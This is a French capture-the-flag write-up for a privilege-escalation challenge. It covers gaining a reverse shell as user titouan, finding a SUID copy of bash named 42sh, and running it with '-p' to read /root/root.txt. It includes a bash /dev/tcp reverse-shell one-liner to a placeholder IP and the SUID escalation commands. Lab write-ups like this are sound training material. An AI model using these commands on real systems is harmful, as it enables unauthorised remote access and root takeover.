# H4ck3rz #2

## Contexte
- **Nom du challenge** : H4ck3rz #2
- **Catégorie** : Privilege Escalation
- **Difficulté** : Medium
- **Objectif** : lire le fichier `/root/root.txt`, ce qui nécessite les droits **root**.
- **Point de départ** : accès en tant qu'utilisateur `titouan`
  (obtenu à la fin du challenge *H4ck3rz*).

---

## 1. Reverse shell

Pour travailler plus confortablement en tant que `titouan`, on ouvre un listener sur la
machine attaquante :

```bash
nc -lvnp 4444
```

Puis on envoie le payload via le Shell Panel (accessible en `www-data`, qui peut exécuter
des commandes en tant que `titouan` grâce au `sudo NOPASSWD: ALL`) :

```bash
sudo -u titouan bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"
```

Résultat : **shell interactif obtenu directement en tant que `titouan`**.

---

## 2. Découverte du vecteur d'élévation

En explorant le home de `titouan`, on trouve un binaire **SUID root inhabituel** :

```bash
ls -la /home/titouan/42sh
# -rwsrwsrwt 1 root root ... /home/titouan/42sh
```

Le propriétaire est `root` et le bit **SUID** est activé : un lancement du binaire
s'exécute donc avec les privilèges de `root`.

---

## 3. Analyse du binaire

L'analyse des chaînes internes du binaire montre qu'il s'agit d'une **copie de
`/bin/bash`** renommée en `42sh` avec le bit SUID activé :

```bash
grep -a -oE "[[:print:]]{4,}" /home/titouan/42sh
```

Les symboles retrouvés (builtins, gestion de l'historique, `readline`...) correspondent
exactement au code source de **GNU bash**.

---

## 4. Exploitation (titouan → root)

**Vulnérabilité** : bash abaisse automatiquement ses privilèges effectifs au démarrage
quand UID réel ≠ UID effectif (protection native), d'où `whoami` renvoyant `titouan`
malgré le SUID root lors d'un lancement standard.

Le flag `-p` (mode privilégié) **désactive cet abaissement automatique** :

```bash
/home/titouan/42sh -p
# whoami -> root
cat /root/root.txt   # (cat n'est plus filtré dans ce shell)
```

→ **shell root obtenu**, lecture de `/root/root.txt` → **flag `root.txt` obtenu**.

---

## Récapitulatif de la chaîne d'attaque

| Étape | De → Vers | Vecteur exploité |
|-------|-----------|------------------|
| 1 | `titouan` | Reverse shell (confort d'exploitation) |
| 2 | `titouan` → `root` | Binaire SUID = bash déguisé (`42sh`) + `bash -p` → `root.txt` |

---

## Outils utilisés
- `nc` (netcat) — listener pour le reverse shell
- `grep` — analyse des chaînes du binaire SUID
- `sudo` — exécution du payload en tant que `titouan`
- `ls` — repérage du binaire SUID

## Techniques utilisées
- **Reverse shell** pour un accès interactif
- **Énumération de binaires SUID**
- **Analyse statique** de binaire (extraction de chaînes)
- **Privilege escalation via binaire SUID** (bash déguisé + flag `-p`, cf. GTFOBins)
